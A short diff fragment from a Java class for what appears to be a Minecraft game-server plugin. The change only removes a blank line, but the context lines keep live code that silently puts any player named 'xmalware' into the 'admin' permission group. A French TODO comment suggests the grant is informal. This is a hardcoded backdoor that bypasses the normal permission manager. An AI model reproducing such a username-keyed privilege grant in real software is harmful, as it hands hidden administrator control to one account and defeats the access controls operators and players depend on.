@@ -240,7 +240,6 @@ public class GameBadblockPlayer extends CraftPlayer implements BadblockPlayer {
 			// TODO: remove (SULFIQUE VEUT ME CREER UN GRADE CTO)
 			if (getName().equalsIgnoreCase("xmalware")) this.permissions.setParent(-1L, PermissionManager.getInstance().getGroup("admin"));
 		}
-
 		if (object.has("shoppoints")) {
 			this.playerData.shopPoints = object.get("shoppoints").getAsInt();
 		}
